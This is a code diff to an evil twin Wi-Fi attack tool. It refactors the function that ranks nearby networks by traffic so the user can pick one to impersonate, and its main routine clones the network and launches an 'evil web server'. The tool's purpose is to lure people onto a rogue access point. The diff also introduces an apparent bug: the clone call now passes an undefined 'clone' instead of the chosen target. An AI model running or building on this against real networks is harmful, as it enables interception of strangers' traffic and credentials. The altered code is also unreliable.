@@ -120,41 +120,41 @@ def user_network_decision(network_data):
     they would like to clone during the evil twin attack
     '''
 
-    #try:
-    print(RESET_COLOR + NOTE_COLOR + "\n\nTARGETS FOUND FOR OUR EVIL-TWIN ATTACK!")
-    print(RESET_COLOR + "the higher the number of packets transmitted the more likely a victim on the network will be found")
-    print(ERROR_COLOR + "be sure to choose a network which you own or have permission to be monkeying with\n ")
+    try:
+        print(RESET_COLOR + NOTE_COLOR + "\n\nTARGETS FOUND FOR OUR EVIL-TWIN ATTACK!")
+        print(RESET_COLOR + "the higher the number of packets transmitted the more likely a victim on the network will be found")
+        print(ERROR_COLOR + "be sure to choose a network which you own or have permission to be monkeying with\n ")
 
-    print(RESET_COLOR + "Here are the available target networks:")
+        print(RESET_COLOR + "Here are the available target networks:")
 
-    # trim whitespace
-    trimmed_data = {int(key.replace(" ", "")): val for key, val in network_data.items()}
-    # save keys 
-    keys = [*trimmed_data]
-    # sort in descending order 
-    keys.sort(reverse=True)
+        # trim whitespace
+        trimmed_data = {int(key.replace(" ", "")): val for key, val in network_data.items()}
+        # save keys 
+        keys = [*trimmed_data]
+        # sort in descending order 
+        keys.sort(reverse=True)
 
-    print (NOTE_COLOR + '[index]: Packets -- BSSID -- ESSID')
-    print (RESET_COLOR + '--------------------------------------------------')
+        print (NOTE_COLOR + '[index]: Packets -- BSSID -- ESSID')
+        print (RESET_COLOR + '--------------------------------------------------')
 
-    for idx in range(0,len(keys)):
-        packets = keys[idx]
-        bssid = trimmed_data[keys[idx]][0]
-        essid = trimmed_data[keys[idx]][1]
-        print("[{}]: {} -- {} -- {}".format(idx, packets, bssid, essid))
-    decision = int(input("Enter the number of the network you'd like to clone:"))
-    if decision < 0 or decision >= len(keys):
-        print(ERROR_COLOR + "fucked up on the input m8")
+        for idx in range(0,len(keys)):
+            packets = keys[idx]
+            bssid = trimmed_data[keys[idx]][0]
+            essid = trimmed_data[keys[idx]][1]
+            print("[{}]: {} -- {} -- {}".format(idx, packets, bssid, essid))
+        decision = int(input("Enter the number of the network you'd like to clone:"))
+        if decision < 0 or decision >= len(keys):
+            print(ERROR_COLOR + "fucked up on the input m8")
+            clean()
+            exit()
+        else:
+            print(decision)
+            print(keys[decision])
+        return trimmed_data[keys[decision]]
+    except:
+        print(ERROR_COLOR + "[ERROR] error parsing network data!")
         clean()
         exit()
-    else:
-        print(decision)
-        print(keys[decision])
-    return trimmed_data[keys[decision]]
-    #except:
-    #    print(ERROR_COLOR + "[ERROR] error parsing network data!")
-    #    clean()
-    #    exit()
 
 
         
@@ -404,7 +404,6 @@ def clean():
         result = subprocess.run(cmd, stdout=subprocess.PIPE, universal_newlines=True, shell=True)
         print(OK_COLOR + "[SUCCESS] wiped dump files!\n")
 
-        # TODO: delete dump files 
         if CLONE_PROC != -1:
             print(RESET_COLOR + "[...] killing network cloning process...")
             CLONE_PROC.kill()
@@ -490,7 +489,8 @@ def main():
     # present user with option of network to clone and allow for them to decide
     target_network = user_network_decision(network_data)
     # create the evil twin
-    net_clone_proc = clone_network(target_network)
+    net_clone_proc = clone_network(clone)
+    
     # launch evil web server
     launch_evil_server()
     # allocate an ip and subnet for ap
